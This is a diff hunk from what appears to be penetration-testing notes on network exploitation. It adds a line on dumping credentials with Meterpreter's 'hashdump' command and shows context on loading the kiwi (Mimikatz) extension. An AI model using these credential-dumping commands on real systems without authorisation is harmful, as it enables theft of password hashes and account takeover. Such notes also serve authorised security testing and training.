@@ -323,6 +323,9 @@ a. Network Exploitation
 			
 			2.) In Meterpreter, Load kiwi : Kiwi - extension to meterpreter, to allow you to execute Mimikatz commands.
 			command: load kiwi
+
+			You can also dump credentials if you have Administrator meterpreter:
+			command: hashdump
 			
 			3.) Make sure to operate in the correct architecture; otherwise you will not be able to extract data properly.
 			command: bg
